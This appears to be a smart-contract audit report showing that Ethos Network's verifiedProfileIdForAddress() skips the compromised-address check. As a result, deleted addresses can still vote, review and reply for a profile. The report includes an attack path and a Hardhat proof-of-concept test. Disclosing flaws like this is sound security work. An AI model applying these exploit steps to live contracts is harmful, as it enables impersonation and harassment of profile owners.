# A compromised address will still be able to take action on behalf of the profile after it has been deleted due to an insufficient check in `EthosProfile::verifiedProfileIdForAddress()``

## Summary

An insufficient check in `EthosProfile.verifiedProfileIdForAddress()` causes a deleted address to still be able to take action on behalf of the profile that it was associated with.

## Vulnerability Detail

Users on the Ethos Network are given the option (and are encouraged) to register all their different addresses with their profile ID.
When one of these addresses is compromised, the user can call `EthosProfile.deleteAddressAtIndex()` to delete the compromised address. This should ensure that the compromised address can no longer take action on behalf of the profile.

In the `EthosVote::addVote()` function, there is a call to the `EthosProfile::verifiedProfileIdForAddress()` function to ensure that `msg.sender` is associated with a profile and has not been deleted. This function will return the `profileId` to which `msg.sender` is connected. The vote will then be cast on behalf of the returned `profileId`.

```solidity
function voteFor(
  address targetContract,
  uint256 targetId,
  bool isUpvote
) external whenNotPaused isValidTarget(targetContract) {
  ... ...
  uint256 voter = IEthosProfile(contractAddressManager.getContractAddressForName(ETHOS_PROFILE))
    .verifiedProfileIdForAddress(msg.sender);
  ... ...
  }
```
In the `verifiedProfileIdForAddress()` function, the profile associated with `msg.sender` is checked to ensure it is `verified`, not `archieved` and no `mock`.
However, it does not verify if `msg.sender` is marked as compromised.
This means the `profileId` associated with `msg.sender` will still be returned even if it has already been deleted due to being compromised.

This issue also occurs in `EthosDiscussion::addReply()`, `EthosDiscussion::editReply()`, `EthosReview::addReview()`, `EthosReview::editReview()`, and `EthosReview::restoreReview()`.

### Attack Path

1. A user registers AddressA to his profile by calling `EthosProfile::registerAddress()`.
2. AddressA gets compromised.
3. UserA calls `deleteAddressAtIndex()` to delete the compromised address from his profile.
4. The compromised address can still take most of the actions possible on the Ethos Network (i.e. `voteFor()`).

### PoC

The following test should be added in `EthosVote.test.ts`:

```javascript
    it('should succeed if user is deleted from profileId that votes', async () => {
      const {
        VOTER_0,
        REVIEW_CREATOR_0,
        REVIEW_SUBJECT_0,
        ADMIN,
        ethosVote,
        ethosReview,
        OWNER,
        ethosProfile,
        OTHER_0,
        EXPECTED_SIGNER,
      } = await loadFixture(deployFixture);
      
      const TARGET_CONTRACT = await ethosReview.getAddress();
      const TARGET_ID = 0;
      const IS_UPVOTE = true;

      await ethosProfile.connect(OWNER).inviteAddress(REVIEW_CREATOR_0.address);
      await ethosProfile.connect(REVIEW_CREATOR_0).createProfile(1);

      let addressesProfile = await ethosProfile.addressesForProfile(2);
      expect(addressesProfile.length).to.be.equal(1, 'should be 1 address');
      expect(addressesProfile[0]).to.be.equal(REVIEW_CREATOR_0.address, 'wrong address[0]');

      // create a review
      await addReview(ADMIN, REVIEW_CREATOR_0, REVIEW_SUBJECT_0, ethosReview);
      
      const profileId = String(4);
      let rand = '123';
      let signature = await common.signatureForRegisterAddress(
        OTHER_0.address,
        profileId,
        rand,
        EXPECTED_SIGNER,
      );

      await ethosProfile.connect(OWNER).inviteAddress(VOTER_0.address);
      await ethosProfile.connect(VOTER_0).createProfile(1);

      let verifiedProfileId = await ethosProfile.verifiedProfileIdForAddress(
        VOTER_0.address,
      );
      expect(verifiedProfileId).to.be.equal(4, 'should be 4');

      await ethosProfile
        .connect(VOTER_0)
        .registerAddress(OTHER_0.address, profileId, rand, signature);

      let addresses = await ethosProfile.addressesForProfile(4);
      expect(addresses.length).to.be.equal(2, 'should be 2 addresses');
      expect(addresses[0]).to.be.equal(VOTER_0.address, 'wrong address[0]');
      expect(addresses[1]).to.be.equal(OTHER_0.address, 'wrong address[1]');
      
      
      // delete address at index 1
      await ethosProfile.connect(VOTER_0).deleteAddressAtIndex(1);

      addresses = await ethosProfile.addressesForProfile(4);
      expect(addresses.length).to.be.equal(1, 'should be 1 address');
      expect(addresses[0]).to.be.equal(VOTER_0.address, 'wrong address[0]');
      
      verifiedProfileId = await ethosProfile.verifiedProfileIdForAddress(
        OTHER_0.address,
      );
      expect(verifiedProfileId).to.be.equal(4, 'should be 4');
      
      await ethosVote.connect(OTHER_0).voteFor(TARGET_CONTRACT, TARGET_ID, IS_UPVOTE);

      const vote = await ethosVote.votes(1);
      expect(vote.isUpvote).to.be.equal(true);
      
      let votesCount = await ethosVote.votesCountFor(TARGET_CONTRACT, TARGET_ID);
      expect(votesCount.upvotes).to.equal(1, 'Wrong isUpvote, 0');
    });
```

Even though this test only shows that a deleted address can still vote on behalf of the profile that it belonged to, the same will also work for reviews and replies.

### Impact

A compromised address will be able to add and edit votes, reviews and replies even though it has been deleted from the profile.

This is the worst-case scenario for a social network, as there would be no one to prevent the compromised account from harassing the user or taking nearly any action on behalf of the profile.
Furthermore, this affects every profile on the social network, as the compromised account can downvote, leave negative reviews, and post inappropriate replies.

Even though no funds are involved, this should still be considered a valid high finding, as the situation cannot worsen for a protocol with no funds involved.
